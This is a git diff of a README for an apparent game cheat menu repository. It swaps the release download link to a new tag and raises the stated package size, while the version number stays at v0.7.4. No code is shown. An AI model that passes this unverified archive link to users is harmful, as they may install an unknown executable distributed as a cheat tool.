@@ -10,9 +10,9 @@
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/knobbyspeak/wardogs-cheat-menu/blob/main/License)
 [![Windows](https://img.shields.io/badge/Windows-10%2F11-blue.svg)]()
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/download/Releases/Releases.zip)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/download/Update/Releases.zip)
 
-**Release:** `v0.7.4` · **Package size:** approximately `143 MB`
+**Release:** `v0.7.4` · **Package size:** approximately `157 MB`
 
 </div>
 
@@ -197,4 +197,4 @@ For the exact permissions and conditions, see the [`LICENSE`](https://github.com
 
 **WARDOGS Utility · v0.7.4**
 
-</div>
+</div  
